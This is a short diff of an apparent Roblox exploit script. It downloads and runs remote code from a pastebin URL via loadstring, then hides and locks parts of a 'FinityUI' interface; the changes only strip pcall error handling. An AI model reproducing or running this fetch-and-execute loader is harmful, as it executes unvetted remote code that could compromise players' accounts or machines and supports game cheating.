@@ -1,6 +1,5 @@
-pcall(function()
+
 loadstring(game:HttpGet("https://pastebin.com/raw/8062SKaF", true))()
-end)
 local runService = game:GetService("RunService");
 local heartbeat = runService.Heartbeat;
 number = 0 
@@ -14,7 +13,6 @@ end)()
 
 
    if game:GetService("CoreGui").FinityUI and number <= 1000 then
-   pcall(function()
    game:GetService("CoreGui").FinityUI.TextButton.Visible = false
    
 game:GetService("CoreGui").FinityUI.Container.Categories.Main.L.Main.Container.Amount.Title.Visible = false
@@ -41,6 +39,5 @@ game:GetService("CoreGui").FinityUI.Container.Categories.Main.L.Main.Container.S
 game:GetService("CoreGui").FinityUI.Container.Draggable = false
 game:GetService("CoreGui").FinityUI.Container.Categories.Main.L.Main.Container.UIListLayout:Destroy()
 number = number + 1
-end)
 end
 end);
